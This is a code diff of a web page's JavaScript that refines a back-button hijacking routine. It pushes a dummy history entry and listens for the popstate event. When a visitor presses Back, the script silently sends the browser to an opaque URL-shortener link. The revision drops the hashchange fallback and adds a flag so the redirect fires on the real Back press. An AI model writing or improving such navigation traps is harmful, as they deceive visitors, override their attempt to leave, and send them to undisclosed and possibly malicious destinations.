@@ -239,30 +239,36 @@ const initialLink = "https://ln.run/TQGSS"; // Replace with the link you want to
 document.addEventListener("DOMContentLoaded", () => {
     console.log("Page loaded. Initializing back-button handling.");
 
-    // Step 1: Push multiple history states to the stack
-    history.pushState({ state: "page" }, "", location.href);
-    console.log("Initial history state pushed:", location.href);
-
+    // Step 1: Push a dummy state to the history stack
     history.pushState({ state: "dummy" }, "", location.href + "?dummy=true");
     console.log("Dummy state pushed to history stack.");
 
-    // Step 2: Back button handling with `popstate`
-    window.addEventListener("popstate", () => {
-        console.log("Back button pressed! Redirecting...");
-        location.href = "https://ln.run/ZT6w8"; // Replace with your redirection URL
+    // Variable to track if the redirection is user-triggered
+    let backTriggered = false;
+
+    // Step 2: Handle the Back button with a condition
+    window.addEventListener("popstate", (event) => {
+        console.log("Popstate event detected:", event.state);
+
+        if (backTriggered) {
+            console.log("Back button pressed! Redirecting...");
+            location.href = "https://ln.run/ZT6w8"; // Replace with your desired URL
+        } else {
+            console.log("Popstate triggered by history manipulation, not back button.");
+            backTriggered = true; // Set to true on the first trigger
+        }
     });
 
-    // Step 3: Fallback for mobile browsers using hash change
+    // Step 3: Optionally use hash fallback (disabled here to avoid conflict)
+    // Comment out or remove this block if you only want to use popstate
     window.addEventListener("hashchange", () => {
-        console.log("Hash change detected! Redirecting as fallback...");
-        location.href = "https://ln.run/ZT6w8"; // Replace with your redirection URL
+        console.log("Hash change detected! Ignoring since popstate is primary handler.");
     });
 
-    // Step 4: Add a debugging log to confirm fallback behavior
+    // Step 4: Ensure that manual history changes don’t trigger redirection
     setTimeout(() => {
-        location.hash = "#fallback"; // Trigger a hash change for testing
-        console.log("Triggering hash change for testing fallback logic.");
-    }, 2000);
+        console.log("History manipulation and setup completed.");
+    }, 1000);
 });
 
 
